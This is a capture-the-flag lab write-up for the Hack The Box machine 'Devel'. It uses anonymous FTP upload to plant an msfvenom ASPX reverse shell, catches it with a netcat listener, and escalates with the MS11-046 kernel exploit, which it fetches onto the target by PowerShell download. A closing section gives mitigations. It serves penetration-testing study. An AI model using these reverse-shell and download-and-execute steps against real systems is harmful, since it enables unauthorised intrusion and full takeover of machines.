# Devel Writeup w/o Metasploit

![](https://miro.medium.com/max/591/1*oMFTLi_I0i-lq_2w1AzKVQ.png)

## Reconnaissance <a id="794e"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.5
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that port 80 is open with Microsoft IIS web server running on it and port 21 is open with FTP running on it.

![](https://miro.medium.com/max/1020/1*d_RU0N6p7Jq3L2U4xjWB_A.png)

Before we start investigating the open ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.5
```

We get back the same results as above.

![](https://miro.medium.com/max/1016/1*hDG9Vpke4PTu-qHcqiFgyQ.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -oA nmap/udp 10.10.10.5
```

We get back the following result. As can be seen, the top 1000 ports are closed.

![](https://miro.medium.com/max/962/1*RSpSTc-uhdKgeG4AkBYE9g.png)

Our only avenue of attack is port 80 & port 21. The nmap scan did show that FTP allowed anonymous logins and so we’ll start there.

## Enumeration <a id="4ace"></a>

Anonymous File Transfer Protocol \(FTP\) allow anyone to log into the FTP server with the username “anonymous” and any password to access the files on the server.

Since anonymous login is supported, let’s log into the ftp server using the “anonymous” username and any password.

![](https://miro.medium.com/max/876/1*WBX7Z9_cACpzZ4Wt_E8ssg.png)

Okay, we’re in! Let’s view the files in the current directory.

![](https://miro.medium.com/max/800/1*0w9cHvVn0yDPHnSlRzKfjg.png)

Try navigating to these files in the browser.

![](https://miro.medium.com/max/1043/1*lGveH44s5a0Gxbsin4swiw.png)

The FTP server seems to be in the same root as the HTTP server. Why is that interesting? Well, if I upload a reverse shell in the FTP server, I might be able to run it through the web server.

To test out our theory, we’ll create a test.html file that displays the word “hello”.

![](https://miro.medium.com/max/742/1*2orMgPfOS4FRRk8DaDUDOQ.png)

Upload the file on the ftp server.

![](https://miro.medium.com/max/706/1*N6lrbk0Z5Bi4naBv1MTStw.png)

List the files in the directory to confirm that the file has been uploaded.

![](https://miro.medium.com/max/652/1*hIaJ5PwS9aHl7YK2xLDmWQ.png)

In the web browser, check if the test.html file is rendered in the web server.

![](https://miro.medium.com/max/571/1*lmTo521jt20qY7YmUILPPg.png)

Alright! This confirms that if we upload a file in the ftp server, and call it in the browser it will get executed by the web server. Our nmap scan showed that the web server is Microsoft IIS version 7.5. IIS web server generally either executes ASP or ASPX \(ASP.NET\). Since the version is 7.5, further googling tells us that it likely supports ASPX.

## Gaining a Foothold <a id="4ff1"></a>

Let’s use MSFvenom to generate our reverse shell. MSFvenom is a framework that is largely used for payload generation. To display the format of payloads it supports, run the following command.

```text
msfvenom --list formats
```

The output shows that aspx is one of the options. Similarly, you can check the payload options with the following command. Since the machine we’re working with is Windows, we filter out the results to only show us Windows payloads.

```text
msfvenom --list payloads | grep windows
```

We’ll go with the general reverse shell since Meterpreter is not allowed in the OSCP.

Run the following MSFvenom command to generate the aspx payload.

```text
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx
```

* **-p**: payload
* **-f**: format
* **LHOST**: attack machine’s \(kali\) IP address
* **LPORT**: the port you want to send the reverse shell across
* **-o**: where to save the payload

Then, we’ll upload the generated payload on the FTP server and confirm that it has been uploaded.

![](https://miro.medium.com/max/570/1*UpIYJPkkjtTKyMy76-QgWA.png)

Start a netcat listener on the attack machine to receive the reverse shell when it’s executed.

```text

nc -nlvp 4444
```

In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP server.

![](https://miro.medium.com/max/621/1*JKtD5A0GdBOUFjQMaKBQOQ.png)

Go back to your listener to see if the shell connected back.

![](https://miro.medium.com/max/680/1*DEMXPJVemBsr7MHG5otCYg.png)

Perfect! We have a shell and it’s running as **iis apppool\web**.

Change the directory to the **Users** directory where the flags are stored.

![](https://miro.medium.com/max/614/1*X4TMt5gf3wUt4Sl_c40MTA.png)

Try to access the **babis** and **Administrator** user directories.

![](https://miro.medium.com/max/476/1*hDwUXi_qY8cpGaOrYIrsGA.png)

We don’t have permission, so let’s learn more about the operating system to see if we can escalate privileges.

```text
systeminfo
```

The above command returns information about the system.

![](https://miro.medium.com/max/961/1*kZycn4uaqKbyilQkSSm6dA.png)

We’re on a Microsoft Windows 7 build 7600 system. It’s fairly old and does not seem to have been updated, so it’s probably vulnerable to a bunch of exploits.

## Privilege Escalation <a id="ca7c"></a>

Let’s use google to look for exploits.

![](https://miro.medium.com/max/773/1*3u6nJaYxoyWjmtpSl8SPzw.png)

The first two exploits displayed allow us to escalate privileges. The second exploit \(MS11–046\), has documentation on how to compile the source code, so we’ll go with that one.

Get the **EDB-ID** from the web page, so that we can use it to find the exploit in **searchsploit**.

![](https://miro.medium.com/max/315/1*Jzmov1T7A3yERiX9WILsAQ.png)

Update **searchsploit** to ensure you have all the latest vulnerabilities.

```text
searchsploit -u 
```

Use the **-m** flag to look for the exploit **40564** and copy it to the current directory.

```text
searchsploit -m 40564
```

![](https://miro.medium.com/max/832/1*mP4lC3jgHcAIc3sqyrPE_Q.png)

Now, we need to compile the exploit. The compilation instructions are in the [exploitdb webpage](https://www.exploit-db.com/exploits/40564).

![](https://miro.medium.com/max/768/1*5vBVQwS3cjvosENTY8RbYA.png)

If you don’t have mingw-w64 installed, install it.

```text
apt-get updateapt-get install mingw-w64
```

Compile it using the listed command.

```text
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Alright, we have a compiled exploit. Now what is left is to transfer the exploit to the target \(Devel\) machine.

Start up a server on the attack \(Kali\) machine.

```text
python -m SimpleHTTPServer 9005
```

Netcat doesn’t seem to be installed on Windows, but powershell is. So, we’ll use it to transfer the file from our server to a directory we can write to.

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.30:9005/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

![](https://miro.medium.com/max/708/1*sdyxn2zv_pft4yTbT6CIrQ.png)

The file is now in the Downloads directory. Execute it and check if the exploit worked and escalated our privileges.

![](https://miro.medium.com/max/547/1*xG_P5oPYXh5cMZXV77hVyA.png)

We have system! Navigate to the user.txt file and output its content to get the user flag.

![](https://miro.medium.com/max/536/1*vJKrp8Y06jE5dPdFT--Qqw.png)

![](https://miro.medium.com/max/527/1*yKCg168nfYyt1iD-3WJIeQ.png)

Do the same thing for the root flag.

![](https://miro.medium.com/max/571/1*qVTgrGldoi9jdInDsTIA5g.png)

![](https://miro.medium.com/max/524/1*hs1_0ybfeSnfsSSxPKqdKg.png)

## Lessons Learned <a id="d5ae"></a>

There were essentially two vulnerabilities that allowed us to gain system level access to the machine.

The first vulnerability was insecure configuration of the FTP server that allowed us to gain an initial foothold. Our initial way in was through the anonymous login. Then we found out that the FTP server shared the root directory of the web server. Therefore, when we uploaded a reverse shell in the FTP server, we were able to run it using the browser. This gave us a low privileged shell on the machine.

The user should have done two things to avoid this vulnerability:

1. Disabled anonymous access to the FTP server.
2. If anonymous access was necessary, the user should have configured the FTP server to only allow downloads. This way the attacker would not have been able to upload files.

The second vulnerability was a Windows kernel vulnerability that allowed us to elevate privileges. The user should have updated and patched his system when the vulnerability was publicly disclosed and a security update was made available.

